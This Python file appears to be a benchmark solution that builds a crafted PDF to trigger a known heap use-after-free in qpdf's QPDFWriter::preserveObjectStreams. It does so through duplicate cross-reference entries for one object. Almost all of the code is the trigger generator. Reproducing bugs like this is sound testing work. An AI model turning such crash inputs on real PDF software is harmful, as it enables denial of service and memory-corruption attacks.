import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a PDF that triggers the Heap Use After Free in QPDFWriter::preserveObjectStreams
        # vulnerability (oss-fuzz:42535152).
        # The vulnerability is triggered by having multiple entries for the same object ID
        # in the xref stream (or table), specifically involving object streams.
        
        header = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"
        
        # We will create objects:
        # 1: Catalog
        # 2: Pages
        # 3: Page
        # 4: Object Stream (containing Obj 5)
        # 5: Regular Object (Duplicate definition)
        # 6: XRef Stream (Contains duplicate entries for Obj 5)
        
        objects_content = []
        
        # Obj 1: Catalog
        objects_content.append((1, b"<< /Type /Catalog /Pages 2 0 R >>"))
        
        # Obj 2: Pages
        objects_content.append((2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"))
        
        # Obj 3: Page
        objects_content.append((3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] >>"))
        
        # Obj 5: The "loose" definition of Object 5
        objects_content.append((5, b"<< /Type /Annot /Subtype /Widget >>"))
        
        # Obj 4: Object Stream
        # It technically contains Obj 5.
        # "5 0 " indicates Obj 5 is at offset 0.
        stm_payload = b"5 0 << /Type /Annot /Subtype /Widget >>"
        # /First is the offset to the first object's content (length of header "5 0 ")
        stm_first = 4 
        stm_dict = f"<< /Type /ObjStm /N 1 /First {stm_first} /Length {len(stm_payload)} >>".encode('ascii')
        stm_block = stm_dict + b"\nstream\n" + stm_payload + b"\nendstream"
        objects_content.append((4, stm_block))
        
        # Sort objects by ID
        objects_content.sort(key=lambda x: x[0])
        
        body = b""
        offsets = {}
        current_pos = len(header)
        
        for oid, content in objects_content:
            offsets[oid] = current_pos
            obj_blob = f"{oid} 0 obj\n".encode('ascii') + content + b"\nendobj\n"
            body += obj_blob
            current_pos += len(obj_blob)
            
        # Construct XRef Stream (Obj 6)
        # W = [1, 3, 2] -> Type (1 byte), Field2 (3 bytes), Field3 (2 bytes)
        # We define entries for:
        # Range 0 (6 items): 0, 1, 2, 3, 4, 5(compressed)
        # Range 5 (1 item): 5(uncompressed) -> DUPLICATE ENTRY
        # Range 6 (1 item): 6
        
        entries = []
        
        # Entry 0: Free
        entries.append(b"\x00" + (0).to_bytes(3, 'big') + (65535).to_bytes(2, 'big'))
        # Entry 1: Offset
        entries.append(b"\x01" + offsets[1].to_bytes(3, 'big') + (0).to_bytes(2, 'big'))
        # Entry 2: Offset
        entries.append(b"\x01" + offsets[2].to_bytes(3, 'big') + (0).to_bytes(2, 'big'))
        # Entry 3: Offset
        entries.append(b"\x01" + offsets[3].to_bytes(3, 'big') + (0).to_bytes(2, 'big'))
        # Entry 4: Offset (ObjStm)
        entries.append(b"\x01" + offsets[4].to_bytes(3, 'big') + (0).to_bytes(2, 'big'))
        # Entry 5a: Compressed (Type 2) in Obj 4, Index 0
        entries.append(b"\x02" + (4).to_bytes(3, 'big') + (0).to_bytes(2, 'big'))
        
        # Entry 5b: Uncompressed (Type 1) at offsets[5] -> Duplicate ID 5
        entries.append(b"\x01" + offsets[5].to_bytes(3, 'big') + (0).to_bytes(2, 'big'))
        
        # Entry 6: Offset (Obj 6, which starts at current_pos)
        entries.append(b"\x01" + current_pos.to_bytes(3, 'big') + (0).to_bytes(2, 'big'))
        
        xref_data = b"".join(entries)
        comp_xref = zlib.compress(xref_data)
        
        # Index array: [0 6 5 1 6 1]
        # 0 6 -> 0..5 (first 6 entries)
        # 5 1 -> 5    (next 1 entry)
        # 6 1 -> 6    (next 1 entry)
        xref_dict = (
            f"<< /Type /XRef /Size 7 /W [ 1 3 2 ] /Root 1 0 R "
            f"/Index [ 0 6 5 1 6 1 ] /Length {len(comp_xref)} /Filter /FlateDecode >>"
        ).encode('ascii')
        
        obj6 = f"6 0 obj\n".encode('ascii') + xref_dict + b"\nstream\n" + comp_xref + b"\nendstream\nendobj\n"
        
        trailer = f"\nstartxref\n{current_pos}\n%%EOF\n".encode('ascii')
        
        return header + body + obj6 + trailer